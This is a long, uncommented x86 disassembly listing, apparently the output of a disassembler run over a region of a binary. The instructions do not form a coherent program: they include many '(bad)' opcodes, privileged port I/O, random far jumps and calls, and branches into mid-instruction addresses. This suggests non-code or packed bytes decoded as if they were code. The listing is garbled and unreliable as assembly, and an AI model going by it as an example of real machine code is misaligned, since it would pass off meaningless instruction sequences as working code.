  42b3d6:	jmp    0x42b396
  42b3d8:	lahf   
  42b3d9:	ds inc edi
  42b3db:	sbb    al,0xea
  42b3dd:	xchg   edi,eax
  42b3de:	push   edi
  42b3df:	pop    es
  42b3e0:	out    dx,al
  42b3e1:	mov    al,ds:0x65b1a496
  42b3e6:	es mov bl,0xf8
  42b3e9:	repnz data16 xchg ah,ah
  42b3ed:	pop    ebp
  42b3ee:	push   esi
  42b3ef:	rcr    BYTE PTR [esi-0x59],0x99
  42b3f3:	std    
  42b3f4:	sbb    al,0xf7
  42b3f6:	fistp  WORD PTR [ebx]
  42b3f8:	xor    esp,DWORD PTR [ecx-0x24]
  42b3fb:	xchg   ecx,eax
  42b3fc:	jne    0x42b3b1
  42b3fe:	or     al,BYTE PTR [ecx+0x11ed0331]
  42b404:	mov    ecx,0xd251d957
  42b409:	pop    ecx
  42b40a:	pop    esi
  42b40b:	push   esp
  42b40c:	push   eax
  42b40d:	pop    edx
  42b40e:	call   0x8c33adbd
  42b413:	xor    DWORD PTR [eax+0x48],esp
  42b416:	js     0x42b3e7
  42b418:	pop    esi
  42b419:	daa    
  42b41a:	les    edi,FWORD PTR [edi]
  42b41c:	in     al,0x34
  42b41e:	out    0xe9,al
  42b420:	xchg   edi,eax
  42b421:	pusha  
  42b422:	repnz loope 0x42b429
  42b425:	jle    0x42b3cc
  42b427:	jbe    0x42b493
  42b429:	aas    
  42b42a:	out    dx,al
  42b42b:	xor    DWORD PTR [edx-0xc],edi
  42b42e:	push   ebx
  42b42f:	xchg   esi,eax
  42b430:	xchg   esp,eax
  42b431:	sub    eax,DWORD PTR [edx+eiz*4+0x63c21048]
  42b438:	(bad)  
  42b439:	out    dx,al
  42b43a:	jmp    0xf0faa3ff
  42b43f:	jecxz  0x42b44c
  42b441:	and    eax,0x5d76a472
  42b446:	cmp    BYTE PTR [ecx+ebp*1-0x7],0x40
  42b44b:	retf   
  42b44c:	adc    BYTE PTR [ebx+0x2e],ah
  42b44f:	or     ebx,esi
  42b451:	and    BYTE PTR [edi-0x69ed74f9],0xc7
  42b458:	pop    esi
  42b459:	jg     0x42b43e
  42b45b:	and    al,0xba
  42b45d:	mov    ds:0x60eb294c,al
  42b462:	loopne 0x42b3e8
  42b464:	push   eax
  42b465:	pusha  
  42b466:	push   ds
  42b467:	scas   al,BYTE PTR es:[edi]
  42b468:	cmp    eax,0x5d4a4a39
  42b46d:	fmul   QWORD PTR [ebx+0x4a014c7c]
  42b473:	adc    al,0xa6
  42b475:	or     DWORD PTR [ebx-0x5f],eax
  42b478:	push   esp
  42b479:	or     DWORD PTR [ebp-0x48],edx
  42b47c:	loopne 0x42b4b2
  42b47e:	sbb    DWORD PTR [esi+0x49884451],ebx
  42b484:	push   ds
  42b485:	jb     0x42b484
  42b487:	add    esi,DWORD PTR [ebp-0x4046a144]
  42b48d:	aas    
  42b48e:	pop    DWORD PTR [ebp+0x202f5a26]
  42b494:	adc    edx,ebx
  42b496:	jmp    0x605c:0xbdf11210
  42b49d:	inc    ecx
  42b49e:	adc    dh,BYTE PTR [esi-0x300dc410]
  42b4a4:	jle    0x42b492
  42b4a6:	test   DWORD PTR [edx+0x5e],eax
  42b4a9:	jmp    0x42b501
  42b4ab:	rcl    BYTE PTR [ecx],0xd0
  42b4ae:	pop    edi
  42b4af:	inc    esp
  42b4b0:	or     esp,DWORD PTR [ecx+0x1]
  42b4b3:	ficom  WORD PTR [esi+ebx*1-0x46]
  42b4b7:	and    ch,BYTE PTR [eax]
  42b4b9:	(bad)  
  42b4ba:	out    dx,al
  42b4bb:	xchg   edi,eax
  42b4bc:	retf   0xaf84
  42b4bf:	add    ch,BYTE PTR [edx]
  42b4c1:	dec    edi
  42b4c2:	stc    
  42b4c3:	hlt    
  42b4c4:	dec    edi
  42b4c5:	jnp    0x42b479
  42b4c7:	repnz mov ebx,0x5e31c652
  42b4cd:	jge    0x42b539
  42b4cf:	test   al,0x42
  42b4d1:	mov    bl,0xea
  42b4d3:	pop    ss
  42b4d4:	inc    ebx
  42b4d5:	or     eax,0xb69ea3a5
  42b4da:	(bad)  
  42b4dc:	jp     0x42b53d
  42b4de:	xor    eax,0xe2d79d1
  42b4e3:	outs   dx,BYTE PTR ds:[esi]
  42b4e4:	sbb    edi,DWORD PTR [edx+eiz*4-0x3ddeb687]
  42b4eb:	(bad)  
  42b4ec:	mov    ds:0x9e9c6542,al
  42b4f1:	call   0xc56d:0xd812a57a
  42b4f8:	add    DWORD PTR [edi+esi*2-0x12594f5f],edx
  42b4ff:	cmp    BYTE PTR [esp+edi*4+0x4c332ae7],0x35
  42b507:	pop    ebx
  42b508:	lods   eax,DWORD PTR ds:[esi]
  42b509:	sbb    DWORD PTR [edx],ecx
  42b50b:	(bad)  
  42b50c:	outs   dx,BYTE PTR ds:[esi]
  42b50d:	ins    DWORD PTR es:[edi],dx
  42b50e:	xlat   BYTE PTR ds:[ebx]
  42b50f:	pop    ss
  42b510:	div    cl
  42b512:	out    dx,al
  42b513:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b514:	push   edi
  42b515:	inc    ecx
  42b516:	sbb    edi,edi
  42b518:	int    0x23
  42b51a:	cs test al,0xc3
  42b51d:	aad    0xe8
  42b51f:	adc    BYTE PTR [ebp-0xf],dl
  42b522:	pop    ds
  42b523:	ror    DWORD PTR [ecx+0x4],cl
  42b526:	out    dx,al
  42b527:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b528:	mov    esp,0x7814472c
  42b52d:	mov    eax,0xfd6fa0f1
  42b532:	add    al,0x55
  42b534:	ss mov al,0x8d
  42b537:	pop    edx
  42b538:	pop    esi
  42b539:	mov    eax,0xb60cbd87
  42b53e:	loope  0x42b51a
  42b540:	lods   eax,DWORD PTR ds:[esi]
  42b541:	pusha  
  42b542:	repz dec ebp
  42b544:	or     al,bl
  42b546:	les    ebp,FWORD PTR [edi-0x4f113dc4]
  42b54c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b54d:	js     0x42b5af
  42b54f:	push   ebx
  42b550:	mov    bl,0x2c
  42b552:	test   DWORD PTR [esp+edx*8-0x5ecf0e89],esp
  42b559:	xchg   ecx,eax
  42b55a:	outs   dx,BYTE PTR ds:[esi]
  42b55b:	mov    ch,0xa
  42b55d:	pxor   mm2,QWORD PTR [ebx]
  42b560:	push   esi
  42b561:	hlt    
  42b562:	arpl   cx,ax
  42b564:	vsubss xmm5,xmm7,DWORD PTR [ebp-0x6109ee2]
  42b56c:	call   0xba27efac
  42b571:	js     0x42b561
  42b573:	pusha  
  42b574:	in     eax,0x76
  42b576:	sbb    al,0x69
  42b578:	lock sub al,0x1f
  42b57b:	jmp    0x8dde:0xf86d6527
  42b582:	(bad)  
  42b583:	ror    DWORD PTR [esi+0x17],1
  42b586:	jg     0x42b59f
  42b588:	xor    al,0x29
  42b58a:	mov    edx,0x4c07d420
  42b58f:	mov    ah,0xef
  42b591:	lods   eax,DWORD PTR ds:[esi]
  42b592:	or     DWORD PTR [ecx+0x428eee76],esp
  42b598:	mov    ah,0xe
  42b59a:	or     ecx,DWORD PTR [esi-0x4d6a7bce]
  42b5a0:	jg     0x42b54c
  42b5a2:	loopne 0x42b57e
  42b5a4:	sahf   
  42b5a5:	cmp    al,0x3
  42b5a7:	mov    eax,ds:0xd1927d31
  42b5ac:	imul   esp,eax,0xffffffad
  42b5af:	sub    esi,edi
  42b5b1:	sub    bl,ch
  42b5b3:	sub    DWORD PTR [edi+0x7ce307be],ebx
  42b5b9:	mov    ah,al
  42b5bb:	mov    esp,0x309e193a
  42b5c0:	icebp  
  42b5c1:	push   ecx
  42b5c2:	adc    BYTE PTR [ebx+0x24],ah
  42b5c5:	xchg   BYTE PTR [esi],ch
  42b5c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b5c8:	mov    cl,0x95
  42b5ca:	fild   WORD PTR [eax+0x7725085e]
  42b5d0:	pop    ecx
  42b5d1:	jge    0x42b5ea
  42b5d3:	int3   
  42b5d4:	jae    0x42b636
  42b5d6:	add    edx,DWORD PTR [edx+0x64]
  42b5d9:	test   al,0x60
  42b5db:	xchg   ebx,eax
  42b5dc:	js     0x42b5f4
  42b5de:	out    dx,al
  42b5df:	lods   eax,DWORD PTR ds:[esi]
  42b5e0:	sahf   
  42b5e1:	sbb    DWORD PTR [edx],ebp
  42b5e3:	call   0x9e1d:0xbf04a55d
  42b5ea:	mov    eax,es:0x99532335
  42b5f0:	add    DWORD PTR [edi+0x12b88112],ecx
  42b5f6:	out    dx,al
  42b5f7:	test   DWORD PTR [edi-0x1f],0x60d3cd7d
  42b5fe:	scas   eax,DWORD PTR es:[edi]
  42b5ff:	push   ds
  42b600:	inc    ecx
  42b601:	jg     0x42b5c7
  42b603:	(bad)  
  42b604:	mul    DWORD PTR [ecx-0x12]
  42b607:	dec    esi
  42b608:	dec    esp
  42b609:	lds    ebx,FWORD PTR [ebx]
  42b60b:	mov    esi,DWORD PTR [ebp+0x30a0c51b]
  42b611:	ret    
  42b612:	in     eax,dx
  42b613:	repnz xchg ebp,eax
  42b615:	bound  edi,QWORD PTR [ebx-0x5]
  42b618:	pop    edi
  42b619:	cmc    
  42b61a:	jle    0x42b628
  42b61c:	(bad)  
  42b61d:	das    
  42b61e:	adc    DWORD PTR [ecx],esi
  42b620:	jb     0x42b69c
  42b622:	adc    al,0x71
  42b624:	pop    ebx
  42b625:	popa   
  42b626:	mov    DWORD PTR [ecx],esp
  42b628:	ss (bad) 
  42b62b:	mov    ?,WORD PTR [esi]
  42b62d:	in     eax,dx
  42b62e:	out    dx,al
  42b62f:	loop   0x42b620
  42b631:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b632:	jae    0x42b5d0
  42b634:	adc    dh,BYTE PTR [ecx+0x3e8499ab]
  42b63a:	dec    esp
  42b63b:	adc    eax,0xfe267ade
  42b640:	fimul  WORD PTR [ebx]
  42b642:	mov    edi,0xd864c660
  42b647:	mov    al,ds:0x955269ae
  42b64c:	and    eax,0x5f8a1be8
  42b651:	xor    esi,DWORD PTR [edi-0xa]
  42b654:	mov    cl,0xb1
  42b656:	fistp  DWORD PTR [eax-0x6c]
  42b659:	push   esp
  42b65a:	sti    
  42b65b:	jl     0x42b627
  42b65d:	pusha  
  42b65e:	popf   
  42b65f:	lods   eax,DWORD PTR ds:[esi]
  42b660:	jno    0x42b697
  42b662:	nop
  42b663:	pusha  
  42b664:	ficom  WORD PTR [ebx]
  42b666:	out    dx,al
  42b667:	mov    ecx,0xd7532870
  42b66c:	rcr    BYTE PTR [eax-0x59],cl
  42b66f:	mov    al,ds:0x55a638fa
  42b674:	out    0x6e,eax
  42b676:	adc    BYTE PTR [edi+0x5e],al
  42b679:	inc    ebp
  42b67a:	mov    bh,0xfd
  42b67c:	call   0x33b9:0x455a1ae9
  42b683:	lds    edi,FWORD PTR [edi]
  42b685:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b686:	or     esp,DWORD PTR [edx-0x2205defd]
  42b68c:	push   edi
  42b68d:	inc    ecx
  42b68e:	jae    0x42b665
  42b690:	xor    al,0xd5
  42b692:	fsub   DWORD PTR [eax]
  42b694:	lock fisub DWORD PTR [ebx+0x28]
  42b698:	ret    
  42b699:	je     0x42b6d2
  42b69b:	mov    eax,ds:0xb59a6e15
  42b6a0:	mov    ebx,0x5e4edb58
  42b6a5:	es cwde 
  42b6a7:	std    
  42b6a8:	(bad)  
  42b6a9:	in     eax,dx
  42b6aa:	push   esp
  42b6ab:	scas   al,BYTE PTR es:[edi]
  42b6ac:	ret    
  42b6ad:	or     BYTE PTR [ebp+0x627f5e42],bh
  42b6b3:	lods   eax,DWORD PTR ds:[esi]
  42b6b4:	inc    edx
  42b6b5:	fldenv [ebp+0x3b935e11]
  42b6bb:	lods   al,BYTE PTR ds:[esi]
  42b6bc:	add    ecx,DWORD PTR fs:[ecx+0x4d]
  42b6c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b6c1:	pusha  
  42b6c2:	cmp    ah,0x9
  42b6c5:	or     al,BYTE PTR [ebp+edx*2+0x50eea3d2]
  42b6cc:	cmp    DWORD PTR [eax],esp
  42b6ce:	aam    0xf6
  42b6d0:	loopne 0x42b70e
  42b6d2:	push   edx
  42b6d3:	mov    ds:0xda1a44d3,al
  42b6d8:	jae    0x42b692
  42b6da:	jmp    0x69b2:0xee817054
  42b6e1:	mov    al,0xf4
  42b6e3:	mov    dh,0x33
  42b6e5:	call   0x574c:0x4220f149
  42b6ec:	arpl   WORD PTR [ecx-0x7ad5e756],sp
  42b6f2:	xchg   edx,eax
  42b6f3:	js     0x42b6e4
  42b6f5:	mov    bl,0xee
  42b6f7:	push   0xffffffbf
  42b6f9:	mov    al,ds:0x7ca76035
  42b6fe:	add    ah,BYTE PTR [ecx-0x156ed98b]
  42b704:	(bad)
  42b707:	inc    edi
  42b708:	jbe    0x42b769
  42b70a:	out    0x8d,eax
  42b70c:	jnp    0x42b6ca
  42b70e:	sub    al,0xef
  42b710:	mov    edi,DWORD PTR [edi-0x42]
  42b713:	push   eax
  42b714:	sub    al,0xf7
  42b716:	xor    al,0xa3
  42b718:	mov    bh,0x67
  42b71a:	jae    0x42b75f
  42b71c:	pop    ds
  42b71d:	jns    0x42b6cd
  42b71f:	push   esi
  42b720:	or     bh,ah
  42b722:	out    dx,al
  42b723:	aas    
  42b724:	aaa    
  42b725:	ret    
  42b726:	xchg   BYTE PTR [ebp+0x48],ah
  42b729:	lock mov al,es:0x9aedee03
  42b730:	stc    
  42b731:	xchg   BYTE PTR [ebp-0x1476a175],dh
  42b737:	adc    esi,DWORD PTR cs:[edx-0x77]
  42b73b:	fist   DWORD PTR [edi]
  42b73d:	popa   
  42b73e:	cmp    al,0x45
  42b740:	stos   DWORD PTR es:[edi],eax
  42b741:	mov    esi,0x9e241a9
  42b746:	out    dx,al
  42b747:	jmp    0x2bdfc3bd
  42b74c:	pusha  
  42b74d:	pop    ebp
  42b74e:	push   esi
  42b74f:	jmp    0x3c33:0x416d612c
  42b756:	mov    ebx,DWORD PTR [edi+0x25eec8fe]
  42b75c:	or     ebx,DWORD PTR [edi-0x41a9543f]
  42b762:	enter  0x43a1,0x78
  42b766:	jg     0x42b7da
  42b768:	cmp    BYTE PTR [ebx-0x6ccb675],bh
  42b76e:	out    0xfa,eax
  42b770:	outs   dx,BYTE PTR ds:[esi]
  42b771:	xchg   ebx,eax
  42b772:	cmp    eax,0x72f53eac
  42b777:	jbe    0x42b7f4
  42b779:	pop    ecx
  42b77a:	daa    
  42b77b:	inc    eax
  42b77c:	or     ecx,0x52aa0171
  42b782:	fstp   QWORD PTR [edi-0x44da99a3]
  42b788:	daa    
  42b789:	xchg   edx,eax
  42b78a:	ins    DWORD PTR es:[edi],dx
  42b78b:	popf   
  42b78c:	xchg   esi,eax
  42b78d:	lock adc eax,0x78a320a1
  42b793:	scas   al,BYTE PTR es:[edi]
  42b794:	or     dl,bl
  42b796:	popf   
  42b797:	inc    edx
  42b798:	pop    esi
  42b799:	cdq    
  42b79a:	(bad)  
  42b79c:	mov    cl,0xb8
  42b79e:	cmp    bl,BYTE PTR [edi+0x52]
  42b7a1:	popa   
  42b7a2:	mov    ebx,0xa7e25afd
  42b7a7:	stos   DWORD PTR es:[edi],eax
  42b7a8:	outs   dx,BYTE PTR ds:[esi]
  42b7a9:	push   ss
  42b7aa:	out    dx,al
  42b7ab:	sub    BYTE PTR [edx],bh
  42b7ad:	xor    bl,BYTE PTR [edi+0x5c]
  42b7b0:	(bad)  [esi+0xce2a429]
  42b7b6:	jbe    0x42b7fc
  42b7b8:	cmp    al,0x22
  42b7ba:	cs fwait
  42b7bc:	jg     0x42b77c
  42b7be:	pop    ds
  42b7bf:	call   0x5c6d:0x2e796117
  42b7c6:	cld    
  42b7c7:	in     eax,0x25
  42b7c9:	push   edx
  42b7ca:	repnz xor cl,BYTE PTR [esi]
  42b7cd:	popf   
  42b7ce:	outs   dx,BYTE PTR ds:[esi]
  42b7cf:	nop
  42b7d0:	aam    0xc0
  42b7d2:	js     0x42b7fd
  42b7d4:	pop    esi
  42b7d5:	sbb    eax,0x2f456284
  42b7da:	pop    es
  42b7db:	mov    esp,0xd1b46099
  42b7e0:	mov    ch,0xa
  42b7e2:	mov    DWORD PTR [edi],esp
  42b7e4:	jno    0x42b860
  42b7e6:	fdivp  st(0),st
  42b7e8:	pop    ebp
  42b7e9:	(bad)  
  42b7ea:	bound  ebx,QWORD PTR [edx-0x3a3c08c2]
  42b7f0:	add    DWORD PTR cs:[esi+0x569b4fa1],0xb1503d1c
  42b7fb:	es push eax
  42b7fd:	stos   BYTE PTR es:[edi],al
  42b7fe:	adc    edi,DWORD PTR ds:0x98f5f95e
  42b804:	fsub   DWORD PTR [ebp+0x814bf17]
  42b80a:	jae    0x42b7ad
  42b80c:	call   0xed47f6e9
  42b811:	sti    
  42b812:	out    dx,al
  42b813:	adc    eax,0xab657ca
  42b818:	lds    ebp,FWORD PTR [ebp+0x6b16a166]
  42b81e:	add    ebx,esp
  42b820:	push   ds
  42b821:	add    al,BYTE PTR [edi]
  42b823:	ficomp DWORD PTR [ebx-0x2c]
  42b826:	or     ebp,DWORD PTR [ebp+0x22]
  42b829:	xor    cl,BYTE PTR [ebp-0x42]
  42b82c:	dec    edi
  42b82d:	or     eax,0x60738652
  42b832:	cmc    
  42b833:	cmp    DWORD PTR [eax-0x7a501ef8],edx
  42b839:	sbb    esi,DWORD PTR [edx+0x3e60ab74]
  42b83f:	xor    ch,dl
  42b841:	fadd   QWORD PTR [ebx]
  42b843:	nop
  42b844:	mul    BYTE PTR [eax+0x1a]
  42b847:	div    ebx
  42b849:	sub    BYTE PTR [ebx],0xc7
  42b84c:	out    dx,al
  42b84d:	adc    ebx,ebp
  42b84f:	mov    ebx,0x41fb5375
  42b854:	test   al,cl
  42b856:	xor    DWORD PTR [edi-0x5ec65d14],edi
  42b85c:	add    al,0x44
  42b85e:	jmp    0x2b153794
  42b863:	xlat   BYTE PTR ds:[ebx]
  42b864:	pop    esi
  42b865:	adc    DWORD PTR [edi-0xff3f528],ecx
  42b86b:	aaa    
  42b86c:	les    esp,FWORD PTR [eax-0x25]
  42b86f:	sbb    ah,BYTE PTR [ebp+eax*2-0x30d964c2]
  42b876:	out    dx,al
  42b877:	push   ecx
  42b878:	xor    eax,0x38615679
  42b87d:	enter  0xa0f9,0x1b
  42b881:	psubsb mm7,QWORD PTR [edi+0x6b]
  42b885:	and    al,0xdb
  42b887:	jbe    0x42b8c3
  42b889:	mov    ebp,0xe5efb90
  42b88e:	(bad)  
  42b88f:	fwait
  42b890:	mov    esi,edi
  42b892:	mov    eax,fs:0x492cb9eb
  42b898:	mov    al,0xdc
  42b89a:	jmp    0x8b140d62
  42b89f:	aaa    
  42b8a0:	fiadd  WORD PTR [ebx]
  42b8a2:	dec    ebp
  42b8a3:	push   edi
  42b8a4:	ins    BYTE PTR es:[edi],dx
  42b8a5:	pop    edi
  42b8a6:	aam    0x9e
  42b8a8:	in     al,0x4
  42b8aa:	aaa    
  42b8ab:	jmp    0x8e6e:0xead3a13f
  42b8b2:	sbb    BYTE PTR [eax],ah
  42b8b4:	pop    esi
  42b8b5:	mov    cl,0x12
  42b8b7:	push   edx
  42b8b8:	jae    0x42b870
  42b8ba:	(bad)  
  42b8bb:	mov    ss,WORD PTR [ecx+eiz*2]
  42b8be:	and    DWORD PTR [edi],eax
  42b8c0:	in     eax,0x1d
  42b8c2:	cwde   
  42b8c3:	push   ebx
  42b8c4:	inc    esi
  42b8c5:	imul   ebp,esi,0x8b93d2e4
  42b8cb:	mov    esp,0xa1060244
  42b8d0:	xlat   BYTE PTR ds:[ebx]
  42b8d1:	call   0x892057a0
  42b8d6:	outs   dx,DWORD PTR ds:[esi]
  42b8d7:	xchg   ecx,eax
  42b8d8:	pop    esi
  42b8d9:	jo     0x42b8c1
  42b8db:	cld    
  42b8dc:	mov    edx,0xf4d4582f
  42b8e1:	lock aaa 
  42b8e3:	test   edi,edx
  42b8e5:	pusha  
  42b8e6:	loope  0x42b875
  42b8e8:	nop
  42b8e9:	dec    ecx
  42b8ea:	inc    DWORD PTR [esi]
  42b8ec:	pop    ss
  42b8ed:	aad    0xee
  42b8ef:	pop    edi
  42b8f0:	xor    DWORD PTR [edi+0xe],ebx
  42b8f3:	bnd ret 0x50c0
  42b8f7:	mov    es,WORD PTR [ecx]
  42b8f9:	mov    ebx,0xf36ee0f5
  42b8fe:	jmp    0xbf382208
  42b903:	push   ebx
  42b904:	xchg   esi,eax
  42b905:	and    eax,0xa0f4d4eb
  42b90a:	out    0x1d,eax
  42b90c:	dec    edi
  42b90d:	jmp    0x6102eeb4
  42b912:	rcr    BYTE PTR [ebx-0x8],cl
  42b915:	ja     0x42b943
  42b917:	dec    esi
  42b918:	dec    ecx
  42b919:	inc    eax
  42b91a:	loopne 0x42b923
  42b91c:	pop    esi
  42b91d:	bound  ebp,QWORD PTR ds:0xbd4a0fe4
  42b923:	arpl   WORD PTR [edx],bp
  42b925:	imul   ebx,DWORD PTR ds:0x70d85e83,0x9a7a147d
  42b92f:	and    esi,DWORD PTR [edi]
  42b931:	ins    BYTE PTR es:[edi],dx
  42b932:	int3   
  42b933:	adc    bh,BYTE PTR [ecx-0x2c]
  42b936:	out    dx,al
  42b937:	jmp    0xad68:0x9351b7bc
  42b93e:	scas   al,BYTE PTR es:[edi]
  42b93f:	mov    ds:0x2f6088c7,eax
  42b944:	sub    edi,edx
  42b946:	xchg   ah,al
  42b948:	mov    ds:0x4446024a,al
  42b94d:	call   0xe288a380
  42b952:	push   ss
  42b953:	and    eax,0x55835ffb
  42b958:	imul   ebx,DWORD PTR [esi+0x31020e92],0xf66aaf8e
  42b962:	out    dx,al
  42b963:	push   0xfffffffe
  42b965:	push   ss
  42b966:	inc    ebx
  42b967:	sub    eax,DWORD PTR [esi+0x3]
  42b96a:	aaa    
  42b96b:	mov    eax,ds:0xb5a6a470
  42b970:	add    al,0x60
  42b973:	sbb    BYTE PTR [edi+0x5],0xe9
  42b977:	pop    ebp
  42b978:	or     eax,0x2942b1
  42b97d:	test   al,0x47
  42b97f:	mov    eax,ds:0x449a58c4
  42b984:	inc    esp
  42b985:	adc    ah,BYTE PTR [ebp-0x4f90a1df]
  42b98b:	mov    dh,0x4c
  42b98d:	jge    0x42b99b
  42b98f:	mov    esp,0x848460ae
  42b994:	xchg   ecx,eax
  42b995:	push   ss
  42b996:	push   ebp
  42b997:	test   BYTE PTR [edi-0x20b611a9],0x2
  42b99e:	and    cl,0x19
  42b9a1:	jae    0x42b9b6
  42b9a3:	mov    eax,ds:0x4fb31c82
  42b9a8:	dec    ecx
  42b9a9:	jmp    0x42b964
  42b9ab:	mov    BYTE PTR [edx],ah
  42b9ad:	in     al,0x3f
  42b9af:	mov    eax,ds:0x36a2f675
  42b9b4:	push   ecx
  42b9b5:	xchg   BYTE PTR [ecx+eiz*4-0x25],bh
  42b9b9:	cmp    al,dl
  42b9bb:	inc    esi
  42b9bc:	cli    
  42b9bd:	mov    al,0x77
  42b9bf:	push   esi
  42b9c0:	cmp    al,0x1c
  42b9c2:	push   ecx
  42b9c3:	ficomp WORD PTR [esi-0x3c]
  42b9c6:	stos   DWORD PTR es:[edi],eax
  42b9c7:	and    BYTE PTR [esi],ah
  42b9c9:	je     0x42b9a0
  42b9cb:	sahf   
  42b9cc:	stc    
  42b9cd:	xor    DWORD PTR [esp+edi*8-0x42],esi
  42b9d1:	call   0x94c59a02
  42b9d6:	out    dx,al
  42b9d7:	xor    al,0x3e
  42b9d9:	push   ebx
  42b9da:	mov    WORD PTR [esi-0x51],ds
  42b9dd:	test   DWORD PTR [ecx-0x5bdc9071],0x2bfc61e1
  42b9e7:	pusha  
  42b9e8:	mov    es:0xda5d25de,eax
  42b9ee:	and    dh,al
  42b9f0:	pushf  
  42b9f1:	pop    ss
  42b9f2:	push   eax
  42b9f3:	add    al,0x82
  42b9f5:	or     eax,0xec0aa177
  42b9fa:	lock jae 0x42ba29
  42b9fd:	aad    0xb0
  42b9ff:	add    bl,BYTE PTR [edx-0x6a]
  42ba02:	xlat   BYTE PTR es:[ebx]
  42ba04:	xlat   BYTE PTR ds:[ebx]
  42ba05:	sbb    ch,BYTE PTR [esi-0x49]
  42ba08:	mov    esp,0x6ea174fb
  42ba0d:	mov    al,ds:0x4b107bdb
  42ba12:	sub    BYTE PTR [eax+0x6c9ba55e],ch
  42ba18:	iret   
  42ba19:	dec    esi
  42ba1a:	or     ebp,ebx
  42ba1c:	(bad)  
  42ba1d:	pusha  
  42ba1e:	imul   esp,ecx,0x71
  42ba21:	popf   
  42ba22:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ba23:	cmp    DWORD PTR [ecx+0x5198ee1f],eax
  42ba29:	test   eax,0x4ee2788
  42ba2e:	loopne 0x42b9d0
  42ba30:	xchg   edx,eax
  42ba31:	pop    edi
  42ba32:	(bad)  
  42ba33:	repz sar DWORD PTR [edi-0x6aa06138],cl
  42ba3a:	popa   
  42ba3b:	adc    DWORD PTR [esi-0x49],ebp
  42ba3e:	daa    
  42ba3f:	or     ebp,ebp
  42ba41:	mov    dl,0x9d
  42ba43:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ba44:	pop    ds
  42ba45:	out    0xad,eax
  42ba47:	sub    al,0x80
  42ba49:	dec    ebx
  42ba4a:	cmp    di,WORD PTR [edx]
  42ba4d:	pop    ebp
  42ba4e:	out    dx,al
  42ba4f:	add    al,bl
  42ba51:	push   0x945d5b64
  42ba56:	jnp    0x42b9fa
  42ba58:	sub    ecx,DWORD PTR [edx+0x21]
  42ba5b:	cdq    
  42ba5c:	inc    edx
  42ba5d:	cmc    
  42ba5e:	or     eax,0xee8fda7d
  42ba63:	push   es
  42ba64:	(bad)  
  42ba65:	stc    
  42ba66:	sti    
  42ba67:	adc    al,0xbf
  42ba69:	aas    
  42ba6a:	das    
  42ba6b:	mov    eax,ds:0x905281d1
  42ba70:	push   esi
  42ba71:	push   ss
  42ba72:	stos   BYTE PTR es:[edi],al
  42ba73:	cli    
  42ba74:	pop    esi
  42ba75:	jge    0x42bac2
  42ba77:	adc    al,0xee
  42ba79:	xchg   DWORD PTR [esi-0x339f8288],ebx
  42ba7f:	or     BYTE PTR [esi-0x21],ch
  42ba82:	hlt    
  42ba83:	test   dl,al
  42ba85:	aaa    
  42ba86:	arpl   WORD PTR [ecx-0x4e],sp
  42ba89:	je     0x42ba79
  42ba8b:	inc    ecx
  42ba8c:	and    edx,eax
  42ba8e:	clc    
  42ba8f:	ret    
  42ba90:	jbe    0x42ba5f
  42ba92:	and    DWORD PTR [eax+0x2244f965],0x3f
  42ba99:	cmp    cl,BYTE PTR [esi+edx*1]
  42ba9c:	mov    ?,ebx
  42ba9e:	and    eax,0xd2de5ed6
  42baa3:	call   0x21ba4e76
  42baa8:	out    0x5d,al
  42baaa:	push   edx
  42baab:	js     0x42bb0c
  42baad:	in     eax,0x4a
  42baaf:	jp     0x42bb1f
  42bab1:	dec    ebx
  42bab2:	xchg   edx,eax
  42bab3:	xchg   edx,eax
  42bab4:	mov    dh,0x2e
  42bab6:	out    dx,al
  42bab7:	retf   
  42bab8:	jmp    0x65f4de7b
  42babd:	sub    BYTE PTR [ecx+ecx*1+0x13],dh
  42bac1:	pop    edx
  42bac2:	pop    esp
  42bac3:	push   0x67
  42bac5:	xchg   edi,eax
  42bac6:	test   al,0xe0
  42bac8:	mov    dl,0x4b
  42baca:	or     esi,ecx
  42bacc:	pop    esi
  42bacd:	and    edi,DWORD PTR [esi]
  42bacf:	or     BYTE PTR [eax],dl
  42bad1:	jae    0x42babe
  42bad3:	xchg   eax,ebp
  42bad5:	pusha  
  42bad6:	imul   esi,DWORD PTR [esp+ebp*4],0x63
  42bada:	in     eax,0xdb
  42badc:	inc    edx
  42badd:	mov    ds:0x53f8acee,al
  42bae2:	jg     0x42ba95
  42bae4:	pushf  
  42bae5:	cwde   
  42bae6:	shl    DWORD PTR [eax+0x2d0dd21d],0xe4
  42baed:	push   esp
  42baee:	pop    esi
  42baef:	test   al,0x5f
  42baf1:	loope  0x42ba87
  42baf3:	mov    fs,WORD PTR [ebp+esi*2-0x68]
  42baf7:	inc    ecx
  42baf8:	jb     0x42bb4f
  42bafa:	jge    0x42baa0
  42bafc:	inc    eax
  42bafd:	in     eax,dx
  42bafe:	xor    eax,0xa3060d39
  42bb03:	sbb    esi,edx
  42bb05:	mov    edi,0xdced87a8
  42bb0a:	clc    
  42bb0b:	fprem  
  42bb0d:	and    eax,0xe8ac7aee
  42bb12:	cli    
  42bb13:	enter  0x5be4,0xfb
  42bb17:	test   eax,0x63f1df9e
  42bb1c:	ss or  al,0x7e
  42bb1f:	dec    ecx
  42bb20:	jnp    0x42baf7
  42bb22:	out    dx,al
  42bb23:	pop    ebp
  42bb24:	lods   al,BYTE PTR ds:[esi]
  42bb25:	mov    edi,0x26db53ce
  42bb2a:	sbb    edx,DWORD PTR [ebx-0x576437d9]
  42bb30:	stos   BYTE PTR es:[edi],al
  42bb31:	dec    esp
  42bb32:	aam    0x25
  42bb34:	jecxz  0x42bb27
  42bb36:	outs   dx,BYTE PTR ds:[esi]
  42bb37:	je     0x42bb5d
  42bb39:	sbb    ch,BYTE PTR gs:[ebx+0x5c6eff29]
  42bb40:	lds    ebp,FWORD PTR [eax-0xf]
  42bb43:	fwait
  42bb44:	pusha  
  42bb45:	inc    eax
  42bb46:	out    dx,al
  42bb47:	adc    ebp,ebp
  42bb49:	xor    eax,0x19836ca2
  42bb4e:	iret   
  42bb4f:	test   eax,0xb4ee11f8
